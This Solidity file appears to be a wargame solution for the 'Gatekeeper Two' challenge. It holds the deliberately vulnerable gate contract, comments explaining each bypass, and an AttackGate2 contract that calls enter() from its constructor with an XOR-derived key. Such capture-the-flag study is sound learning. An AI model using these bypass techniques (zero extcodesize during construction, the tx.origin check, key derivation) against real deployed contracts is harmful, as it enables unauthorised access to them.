// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title GatekeeperOne2
/// @author OpenZeppelin
/// @notice GateOne - requires a contract to be used as a middle man
///         GateTwo - The contract calling will need to call the method within the constructor so that the codesize will be 0, contract size is set after contract initialisations
///                   excodesize is solidity assembly lang, and caller refers back to the contract, so the size of the caller will have to be 0 in order to pass the GateTwo
///                   **look into how contracts are created in detail
///         GateThree - Bitwise operation XOR(^) for this, A ^ B = C, so in this case, we can do so A ^ C = B in order to get the key

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

interface GatekeeperTwoInterface {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackGate2 {
    GatekeeperTwoInterface gate2;

    constructor(address _address){
        gate2 = GatekeeperTwoInterface(_address);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0)-1); // This is because (a ^ b = c) == (a ^ c = b)
        gate2.enter{gas:50000}(key);
    }
}


/// works on remix, but need to make changes to hardhat gas settings